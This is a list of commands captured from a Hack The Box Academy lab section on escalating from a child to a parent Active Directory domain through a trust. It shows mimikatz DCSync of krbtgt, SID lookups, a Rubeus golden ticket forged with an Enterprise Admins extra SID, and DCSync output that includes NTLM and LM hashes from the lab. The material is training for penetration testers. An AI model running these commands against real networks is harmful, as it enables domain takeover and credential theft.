# Section 28: Attacking Domain Trusts - Child -> Parent Trusts - from Windows

- Module: Active Directory Enumeration & Attacks (143)
- URL: https://academy.hackthebox.com/app/module/143/section/1457
- Code/command blocks: 12

> Terminal output is omitted; only commands & scripts are captured.

## 1. `powershell` _(output omitted)_

```powershell
 mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
```

## 2. `powershell` _(output omitted)_

```powershell
Get-DomainSID
```

## 3. `powershell` _(output omitted)_

```powershell
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```

## 4. `powershell` _(output omitted)_

```powershell
ls \\academy-ea-dc01.inlanefreight.local\c$
```

## 5. `powershell` _(output omitted)_

```powershell
mimikatz.exe
```

## 6. `powershell` _(output omitted)_

```powershell
klist
```

## 7. `powershell` _(output omitted)_

```powershell
ls \\academy-ea-dc01.inlanefreight.local\c$
```

## 8. `powershell` _(output omitted)_

```powershell
ls \\academy-ea-dc01.inlanefreight.local\c$
```

## 9. `powershell` _(output omitted)_

```powershell
 .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```

## 10. `powershell` _(output omitted)_

```powershell
klist
```

## 11. `powershell` _(output omitted)_

```powershell
.\mimikatz.exe
```

## 12. `powershell`

```powershell
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL

[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\lab_adm' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : lab_adm

** SAM ACCOUNT **

SAM Username         : lab_adm
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 2/27/2022 10:53:21 PM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-1001
Object Relative ID   : 1001

Credentials:
  Hash NTLM: 663715a1a8b957e8e9943cc98ea451b6
    ntlm- 0: 663715a1a8b957e8e9943cc98ea451b6
    ntlm- 1: 663715a1a8b957e8e9943cc98ea451b6
    lm  - 0: 6053227db44e996fe16b107d9d1e95a0
```

